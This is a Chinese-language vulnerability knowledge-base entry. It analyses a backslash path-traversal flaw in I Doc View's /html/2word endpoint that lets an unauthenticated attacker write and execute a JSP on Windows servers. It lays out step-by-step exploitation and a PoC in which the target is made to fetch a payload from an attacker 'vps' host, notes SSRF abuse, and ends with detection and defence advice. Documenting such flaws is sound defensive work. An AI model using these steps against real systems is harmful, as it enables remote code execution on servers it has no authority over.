---
id: web-java-component-idocv-html-2word-link-download-backslash-path-traversal-jsp-rce
title: I Doc View /html/2word 抓取外部 HTML 链接下载，Windows 反斜杠文件名穿越写入 JSP 前台 RCE
type: scenario
domain: web
path: web/java/component
technique: idocv-html-2word-download-filename-backslash-traversal-jsp-write
tags:
- java
- idocv
- i-doc-view
- rce
- path-traversal
- arbitrary-file-write
- jsp
- ssrf
- windows
- component
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V644
  verified_at: '2026-11-13T03:34:06+08:00'
  notes: 已对照原文与全部19张截图核对：toWord/@RequestMapping("2word") 以 dataDir/urlhtml/<md5>/ 为工作目录、index.html 不存在则 downloadHtml（img07）、downloadHtml 补 http:// 前缀并 getWebPage(obj,outputDir,"index.html")（img08）、getWebPage 中 filename=path.substring(lastIndexOf("/")+1)、空则 default.html、fileName 非空覆盖、new File(outputDir,filename) 未净化（img09/19）、HTML 后缀分支用 Jsoup 解析 link[href]/script[src]/img[src] 并 addLinkToFrontier（img12/13）、非 HTML 后缀走 else FileOutputStream 16KB 原样写盘（img15/18）、downloadHtml 循环 filesToGrab 再抓取（img16/17）；实测 VPS 创建字面反斜杠文件名（img01-03）、HTML link 引用（img04）、/html/2word 返回200 docx（img05）、GET /1.jsp 返回200 内容123（img06）。dedup top 候选为 Sobey 上传文件名穿越、同产品 /doc/upload 任意文件读、致远 checkIsSign、万户下载等，入口/sink 均不同，非同链。原文未标注产品版本，affected_versions 保持为空。未验证点：未在真实 IDocView 环境复现；原文未给 dataDir 绝对路径，穿越层数按原文 3 级 ..\；frontmatter 无 sources/source_url。
url: /docs/web/java/component/web-java-component-idocv-html-2word-link-download-backslash-path-traversal-jsp-rce/
draft: false
kb_aliases:
- IDocView 前台 RCE
- I Doc View html/2word RCE
- 2word 接口任意文件写入
- GrabWebPageUtil 路径穿越
- 文档预览 反斜杠路径穿越写 JSP
---

# 一句话结论

I Doc View（Windows 部署）的 `/html/2word?url=<URL>` 会抓取攻击者提供的 HTML 并下载其中 `link[href]`/`script[src]`/`img[src]` 指向的资源；对非 html/htm/asp/aspx/php/net 后缀（如 `.jsp`）直接把响应体写入 `new File(outputDir, filename)`，而 `filename` 取自 URL 路径最后一段且未过滤反斜杠——构造 `http://vps/..\..\..\docview\1.jsp` 即可把攻击者控制的 JSP 写到 Web 可访问目录，访问 `/1.jsp` 执行，形成未授权 RCE（同时具备 SSRF 能力）。

# 原理

- **入口流程**：`toWord` 处理 `/html/2word`，以 `dataDir/urlhtml/<md5(url)>/` 为工作目录，若 `index.html` 不存在则调用 `GrabWebPageUtil.downloadHtml(url, htmlDir)` 抓取页面，随后用外部 `html2word` 转 Word 并回显；抓取阶段即漏洞所在。
- **首屏抓取**：`downloadHtml` 校验 url 非空、不以 http(s) 开头则补 `http://`，创建 `URL` 后调用 `getWebPage(obj, outputDir, "index.html")`——首页文件名被固定为 `index.html`，不会穿越。
- **文件名来源**：`getWebPage` 中 `filename = obj.getPath().substring(path.lastIndexOf('/') + 1)`；为空或 `/` 时用 `default.html`；`fileName` 参数非空时覆盖（首页传 `index.html`）。随后 `outputFile = new File(outputDir, filename)`，**没有做 `..`/`\` 规范化或目录校验**。
- **HTML 解析扩散**：若 `filename` 以 `html/htm/asp/aspx/php/net` 结尾，读入完整响应字符串，用 `searchForNewFilesToGrab` 以 Jsoup 解析 `link[href]`、`script[src]`、`img[src]`，经 `addLinkToFrontier` 加入 `filesToGrab`（绝对/根相对/相对链接分别拼接），同时把 HTML 中的链接替换为文件名后写盘。
- **循环下载**：`downloadHtml` 遍历 `filesToGrab`，对每个链接再调用 `getWebPage(obj, outputDir)`（这次不传 fileName），因此文件名重新由 URL 路径决定。
- **写入分支**：若 `filename` 不以 HTML 类后缀结尾（`.jsp` 不在列表中），走 else 分支：`new FileOutputStream(outputFile)` + 从 `conn.getInputStream()` 按 16KB 循环写入——响应体原样落盘。
- **穿越成立的原因**：Java `URL.getPath()` 把反斜杠当作普通字符保留，`filename` 可以是 `..\..\..\docview\1.jsp`；`new File(outputDir, filename)` 在 Windows 上把 `\` 解析为路径分隔符，逐级 `..` 跳出 `urlhtml/<md5>/`，最终写到 `dataDir` 上层再进入 `docview` 目录（原文用 3 个 `..\` 命中 Web 可访问的 docview 目录）。写入后 `/1.jsp` 由容器编译执行。
- **为什么攻击者链接会被下载**：首屏 HTML 由攻击者控制，其中 `link` 指向恶意 `.jsp` URL；它先被解析加入 `filesToGrab`，再被循环下载。`.jsp` 后缀恰好避开 HTML 解析分支，直接进入原样写盘分支。

# 触发条件

- 目标暴露 I Doc View 的 `/html/2word`（原文为前台未授权访问）。
- 目标为 Windows 部署（依赖反斜杠路径分隔符）；服务进程对 `dataDir` 上层及 `docview` 等 Web 目录有写权限。
- 目标可出网/可达攻击者的 HTTP 服务器（或内网可控 HTTP 源），用于提供首页 HTML 与 JSP 文件。
- 目录层级与 `..\` 数量匹配（原文从 `dataDir/urlhtml/<md5>/` 向上 3 级进入 `docview/`），目标文件名目录存在且 JSP 可执行。

# 利用步骤

1. 在 VPS（Linux）创建字面文件名的 JSP 载荷：`touch '..\..\..\docview\1.jsp'` 或用单引号包裹/转义反斜杠写入 `<% ... %>` 内容。
2. 新建任意 HTML 文件，引用该 JSP：`<link rel="stylesheet" href="http://vps:8000/..\..\..\docview\1.jsp">`（也可用 `script src` / `img src`）。
3. 在 VPS 上启动 HTTP 服务（目录中同时存在该 HTML 与 JSP 文件）。
4. 请求受害机：`GET /html/2word?url=http://vps:8000/2.html`；目标抓取 HTML、解析链接、下载 JSP 并穿越写入 docview 目录。
5. 访问 `http://target/1.jsp` 执行 JSP（原文响应 200，返回内容 `123`，证明文件已落地并被容器解析）。

# PoC

```bash
# VPS（Linux）：创建文件名含反斜杠的 JSP，并准备引用它的 HTML
touch '..\..\..\docview\1.jsp'
# 1.jsp 内容为 JSP 代码（如 <% out.println("123"); %>）；2.html：
# <link rel="stylesheet" type="text/css" href="http://vps:8000/..\..\..\docview\1.jsp">
python3 -m http.server 8000

# 触发受害机抓取
curl 'http://target/html/2word?url=http://vps:8000/2.html'
# 随后访问落地文件
curl 'http://target/1.jsp'
```

# 变体与关联

- 后缀差异：`asp/aspx/php/net/htm/html` 会被当作 HTML 解析并改写链接，`.jsp` 走原样写盘分支，这是选择 `.jsp` 的原因；同理 `.jspx`、`.war` 等不在列表内的后缀也可直接落盘（是否可执行取决于容器配置）。
- 平台差异：该穿越依赖 Windows 的反斜杠分隔符；Linux 目标上 `\` 是普通字符，不能跳出目录。
- 同一抓取逻辑还可发起 SSRF（`url` 指向内网 HTTP），并把内网响应写入可回读目录。
- 关联：同产品不同入口的任意文件读取 [[web-java-component-idocv-doc-upload-url-arbitrary-file-read]]；其他文档预览服务的写入/SSRF 风险 [[web-java-component-kkfileview-compress-zipslip-arbitrary-write]]、[[web-java-component-kkfileview-getcorsfile-urlpath-ssrf-file-read]]。

# 检测与防御

- 检测：`/html/2word` 请求的 `url` 指向外部或异常主机；服务端对同一来源的连续 HTTP 抓取（首屏 + 链接资源）；Web 目录中出现文件名含 `\` 或 `..` 的新文件、docview 目录出现 JSP；服务进程异常写入 Web 根。
- 检测：出站 HTTP 日志中抓取 `.jsp`/`.jspx` 等可执行后缀；WAF 对 `url` 参数中的反斜杠与 `..` 告警。
- 防御：升级/打补丁或下线 `/html/2word`；对下载文件名做 `Paths.get(...).getFileName()` 规范化并拒绝 `..`、`/`、`\`；仅允许白名单域抓取；限制服务出站；以低权限账户运行且不给 Web 目录写权限；确保上传/缓存目录不可执行 JSP。
